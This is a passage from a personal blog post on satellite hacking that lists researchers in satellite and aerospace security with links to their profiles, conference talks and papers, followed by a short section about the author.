Even though her name requires no introduction in the US, I have somehow only heard of her when doing this research on satellites 🙃

And her work has been a great influence since then towards me actually writing this!

[DEF CON 32 - How I Developed a Low Cost Raspberry Pi Based Device for ADS B Spoof - Angelina Tsuboi](https://www.youtube.com/watch?v=KytDyg5s-E8)

[Thirsty Thursdays Live Show With Angelina Tsuboi - Focusing Aerospace Cybersecurity](https://www.youtube.com/watch?v=DdnwFHGSlRI)

[Live Hacking QnA w/ Kody Kinzie](https://www.youtube.com/watch?v=i2a65sPC79c)

[QnA w/ David Bombal](https://www.youtube.com/watch?v=U1-pOPFKcXo)

[YT channel](https://www.youtube.com/@AngelinaTsuboi)

[feel free to also check her udemy course on satellite security](https://www.udemy.com/course/satellite-cybersecurity/)

### Johannes Willbold

[@jwillbold](https://x.com/jwillbold)
[Github](https://github.com/jwillbold)
[linkedIn](https://www.linkedin.com/in/jwillbold)
site: [jwillbold.com](https://jwillbold.com/)

[Space Odyssey: An Experimental Software Security Analysis of Satellites](https://jwillbold.com/paper/willbold2023spaceodyssey.pdf)

### Robin Bisping

[Github](https://github.com/robinbisping)
Site: [www.robinbisping.ch](https://www.robinbisping.ch/)

Relevant links:

[ACM_digital_lib_profile](https://dl.acm.org/profile/99661214484)
[VSAsTer: Uncovering Inherent Security Issues in Current VSAT System Practices](https://dl.acm.org/doi/10.1145/3643833.3656139)
[Space Odyssey: An Experimental Software Security Analysis of Satellites](https://jwillbold.com/paper/willbold2023spaceodyssey.pdf)

### Vincent Lenders

[@VLenders](https://x.com/Vlenders)
[linkedIn](https://www.linkedin.com/in/vincent-lenders-303656)
[Space Odyssey: An Experimental Software Security Analysis of Satellites](https://jwillbold.com/paper/willbold2023spaceodyssey.pdf)
Site: [lenders.ch](https://lenders.ch/)




### "Occupy Theweb" (audio talk & books)

A great hacker who goes by the pseudonym "Occupy Theweb", famous for his books like ["Linux Basics for Hackers"](https://kea.nu/files/textbooks/humblesec/linuxbasicsforhackers.pdf) which you've probably read somewhere...

Also founder of "HACKERS ARISE" (https://www.hackers-arise.com/)
where you can find blogs specifically tailored for satellite hacking:
https://www.hackers-arise.com/blog/categories/satellite-hacking
The site also has articles about radios and critical infrastructure like:
https://www.hackers-arise.com/blog/categories/scada
https://www.hackers-arise.com/blog/categories/sdr-for-hackers

And if you want something to listen to, feel free to check this video by him & David Bombal:
["Satellite hacking (with real world example)](https://www.youtube.com/watch?v=-_cSuaEOXIw)
It covers orbital jamming and the Viasat hack etc...

### Gerard de Jong

Loved his [talk](https://www.youtube.com/watch?v=gMwciWchH3Q) and thought I'd mention his socials

[@gddejong](https://x.com/gddejong)
[linkedin](https://www.linkedin.com/in/gerarddiederikdejong)


### Karl Koscher

[@supersat](https://x.com/supersat)
[Github](https://github.com/supersat)
and you can find more about him [here](https://www.sysnet.ucsd.edu/~supersat/)

Great Hacker!!!
And honestly his works are quite technical and very advanced for me x)
but again, famous for his [DEF CON 30 Talk - Hack the Hemisphere](https://www.youtube.com/watch?v=wQubk70g2wI)

He also has a few more interesting talks like:
[DEF CON 21 - Karl Koscher and Eric Butler - The Secret Life of SIM Cards](https://www.youtube.com/watch?v=_-nxemBCcmU)
[DEF CON 23 - Packet Capture Village - Karl Koscher - Sniffing SCADA](https://www.youtube.com/watch?v=4vPptUmyv4U)
[Karl Koscher: What I Learned Trying to Hack a 737](https://www.youtube.com/watch?v=EaN9VcjlKGE)


### Clémence Poirier

[Bio @ETH_Zürich](https://css.ethz.ch/en/center/people/clemence-poirier.html)
[linkedIn](https://www.linkedin.com/in/cl%C3%A9mence-poirier1/)

[Hacking the Cosmos: Cyber operations against the space sector: A case study from the war in Ukraine](https://www.research-collection.ethz.ch/bitstream/handle/20.500.11850/697348/cyber-reports-2024-10-hacking-the-cosmos.pdf)

[Lessons from the Viasat cybersecurity attack. - N2K Networks (audio)](https://www.youtube.com/watch?v=2_BebvPVBAc)
[(mirror link at space[.]n2k[.]com )](https://space.n2k.com/podcasts/t-minus/ds75)

[Trawling Hacker Forums Uncovers Crucial Information on Space Cyber Attacks](https://interactive.satellitetoday.com/via/november-2024/trawling-hacker-forums-uncovers-crucial-information-on-space-cyber-attacks)

[What Does Selling Your Ground Stations Mean for Cybersecurity?](https://interactive.satellitetoday.com/via/june-2024/what-does-selling-your-ground-stations-mean-for-cybersecurity)

### Jacob Oakley


[Day 3, 1 PM - (Aerospace Village) Hacking Satellites: Houston, We Have a Problem, Jacob Oakley](https://www.youtube.com/watch?v=bHsGfX18DQs)

[Cybersecurity for Space: Protecting the Final Frontier - First Edition (ISBN-13:978-1484257319)](https://www.amazon.com/Cybersecurity-Space-Protecting-Final-Frontier/dp/1484257316)


### James Pavur

[linkedIn](https://www.linkedin.com/in/james-pavur)
[Google Scholar](https://scholar.google.com/citations?user=C4TzxFoAAAAJ&hl=en)
[Bio Page](https://www.cs.ox.ac.uk/people/james.pavur/)


### Matteo Calabrese

[linkedIn](https://www.linkedin.com/in/matcala/)
[ResearchGate](https://www.researchgate.net/profile/Matteo-Calabrese-5)
[Google Scholar](https://scholar.google.com/citations?user=H9fMXgkAAAAJ)

### Brandon Bailey

[bio@aerospace.org](https://aerospace.org/person/brandon-bailey)


[DEF CON 29 Aerospace Village - Brandon Bailey - Unboxing the Spacecraft Software BlackBox Hunting](https://www.youtube.com/watch?v=NkAkL3odXks)


[DEF CON 28 Safe Mode Aerospace Village - Brandon Bailey - Exploiting Spacecraft](https://www.youtube.com/watch?v=WFhoV1c0rlc)
and in the case the link goes down there is a reupload at the aerospace village YT channel called:
[DEF CON 28 Aerospace Village: Exploiting Spacecraft](https://www.youtube.com/watch?v=b8QWNiqTx1c)

[CYSAT 2023: Demo "Hacking Spacecraft using Space Attack Research and Tactic Analysis"](https://www.youtube.com/watch?v=l9nezXxO3iE)

### Martin Strohmeier

[Bio](https://www.cs.ox.ac.uk/people/martin.strohmeier/)
[linkedIn](https://ch.linkedin.com/in/martin-strohmeier-513b8060)
[Google Scholar](https://scholar.google.co.uk/citations?user=QUNoQIYAAAAJ&hl=en)
[Oxford's reference page & Biography](https://www.cs.ox.ac.uk/people/martin.strohmeier/)

Interesting Talks:
[DEF CON 32 - Analyzing the Security of Satellite Based Air Traffic Control - Martin Strohmeier](https://www.youtube.com/watch?v=vJWzTt2ANAQ)

[DEF CON 32 - Exploiting Bluetooth from your car to the bank account$$ - Yso & Martin Strohmeier](https://www.youtube.com/watch?v=MS582wba46E)

[Aerospace Village: Day 2, 130 PM - Elon, Twitter and the PIA: How not to achieve privacy in aviation, Martin Strohmeier](https://www.youtube.com/watch?v=pK-KpG0T9QQ)
and
[Day 2, 2 PM-Labs & Trust: How to build a successful aviation cybersec research | Martin Strohmeier](https://www.youtube.com/watch?v=jfPp_2QrEhI)


[Space Odyssey: An Experimental Software Security Analysis of Satellites](https://jwillbold.com/paper/willbold2023spaceodyssey.pdf)

### Ólafur Waage

[@olafurw](https://x.com/olafurw)
[Github](https://github.com/olafurw)
[linkedIn](https://www.linkedin.com/in/olafurw/)
[YT_channel](https://www.youtube.com/@olafurw/videos)
site: [olafurw.com/](https://olafurw.com/)

Honestly gained my respect for running DOOM on a satellite:
[Running DOOM on a satellite](https://www.youtube.com/watch?v=zthssUIFG6c)
[DOOM in Space - NDC TechTown](https://www.youtube.com/watch?v=GPHDbVPlmMk)
[Github link of the ops-sat DOOM project (github/olafurw/opssat-doom)](https://github.com/olafurw/opssat-doom)



### Georges Labrèche

[@georgeslabreche](https://x.com/georgeslabreche)
[Google_Scholar](https://scholar.google.com/citations?user=E89wAGsAAAAJ)
[linkedIn](https://www.linkedin.com/in/georgeslabreche/)
[Research_Gate](https://www.researchgate.net/profile/Georges-Labreche)
site: [georges.fyi](https://georges.fyi/)

Engineers AI&ML systems on-board satellites.
Check the papers he contributed to!! <3


### Oleg Kutkov

[@olegkutkov](https://x.com/olegkutkov)
site: [olegkutkov.me](https://olegkutkov.me/)

You can find pretty much everything Starlink/firmware/embedded systems related in his blogs:

[Analysis and reverse-engineering of the original Starlink router](https://olegkutkov.me/2021/12/25/analysis-and-reverse-engineering-of-the-original-starlink-router/)
[Initial analysis of the Starlink router gen2](https://olegkutkov.me/2022/04/10/initial-analysis-of-the-starlink-router-gen2/)
[Starlink rev 3 (V2) power architecture](https://olegkutkov.me/2024/12/31/starlink-rev-3-v2-power-architecture/)





## Section_1: Interesting Research & Academic Papers
Now, satellite-hacking research has been quite a niche thing... but I've found a lot of research, even ones dating back to 2009! [(Black Hat DC 2009 - Adam Laurie - Satellite Hacking for Fun and Profit)](https://www.youtube.com/watch?v=PyXZX63etog)


I might also put stuff not relevant to space hacking and more like car/airplace hacking here like [Jmaxxz - Your Car is My Car - DEF CON 27 Conference](https://www.youtube.com/watch?v=w8SG2V3n4-U) and [Radio Hacking: Cars, Hardware, and more! - Samy Kamkar - AppSec California 2016](https://www.youtube.com/watch?v=1RipwqJG50c)

### Aerospace Village
And here I decided to put relevant or interesting stuff that has to do with satellites in particular and embedded systems and IoT in general:

[DEF CON 30 - Gal Zror - Hacking ISPs with Point-to-Pwn Protocol over Ethernet (PPPoE)](https://www.youtube.com/watch?v=Uwwg4gKpy-M)

[Aerospace Village YT videos](https://www.youtube.com/@AerospaceVillage/videos) and relevant [twitter/X account @SecureAerospace](https://x.com/secureaerospace)

Note: It's quite surprising how most of their vids barely reach a thousand views considering they do pentesting on planes like [pentesting the Boeing 737NG airplane by Alexander Dodd](https://www.youtube.com/watch?v=VRb6br_n8dQ) or ["Hunting for Spacecraft Zero Days using Digital Twins" by Brandon Bailey](https://www.youtube.com/watch?v=t_efCpd2PbM)... Actually, the only popular video on this channel I found was because the Boeing 747s received critical sofware update via 3.5" floppy disks which is showcased in their [video at 7:48 called DEF CON 28 Aerospace Village: 747-400 Walk through From a Hacker’s Perspective](https://youtu.be/yq8wgJO-JXY?si=InOk9LFI7PqCj2Zh&t=468)...

And honestly I get it.. some of the videos might be not interesting...
But I'm the kind of person who likes to listen to [hackers just talking about the aerospace sector](https://www.youtube.com/watch?v=ngoYRudoJqA) for fun... so I don't know if I should be taken as a frame of reference x)

other interesting videos:
[Building the Ultimate Budget Friendly Low Earth Orbit Satellite Ground Station](https://www.youtube.com/watch?v=lBSaNGT80e4)




### Interesting Research Papers
I'd usually post Sci-Hub links here...
but thought I'd just put the official links for relevant articles here
and leave the reader free to sail the high seas 🏴‍☠️ 


[Physical Layer Security for Hybrid Satellite Terrestrial Relay Networks With Joint Relay Selection and User Scheduling](https://ieeexplore.ieee.org/document/8478138)

[ADS-C Technical aspects and C Technical aspects and Implementation Status](https://www.icao.int/SAM/Documents/2010/SURAUTOSEM/15%20SITA_ADS%20C%20Technical%20Aspects%20and%20Implementation%20Status.pdf)


## Section_2: whoami

Now, I'm already used to IoT-device hacking; as in proficient when It comes to reversing firmware, exploiting binaries and scrolling through thousands of pages of datasheets... as for the astronomy and "science" part, I still have PTSD from Fourier Integrals and Maxwell's equations...

So yeah...
<div class="custom_style">

![Alt Text](SAT/spider-man-norman-osborn.gif)


</div>

but in no ways I'm a veteran expert when It comes to this stuff..
(I mean I'm still looking for an end-of-studies internship for heaven's sake 🙃)
Which is why I decided to place my references at the bottom here just to reflect that...

Overall, I found this blog very entertaining to write... as in I learned new stuff and got to put my thoughts on a "permanent" medium (aka. the internet)...
So that's cool...

<div style="z-index:999"> 
Note: Writing this blog has been a wormwhole inside of a rabbit hole inside of a yet another wormwhole...
It has been a never ending journey of learning new things and I might have gotten sloppier as time went on since I wanted to publish this blog before It becomes yet another archived project that would never see the light of day... meaning, It might miss a few details here and there or might require further modifications...


And if you have any questions/remarks feel free to contact me [(@sifu0nulls)](https://x.com/sifu0nulls)
or email me at: saif.sebai.ensi@gmail.com

</div>

Now I can finally go back to playing Starsector or Factorio...

<div style="margin-top:-15%;max-width:40%;padding-left:55%;z-index:-1;position: relative;"> 
<!-- padding-bottom:20%; -->

![](SAT/signature.png)

</div>


<!-- RM IMAGE METADATA -->

<!-- RM DUPLICATE / UINNECESSARY FILES -->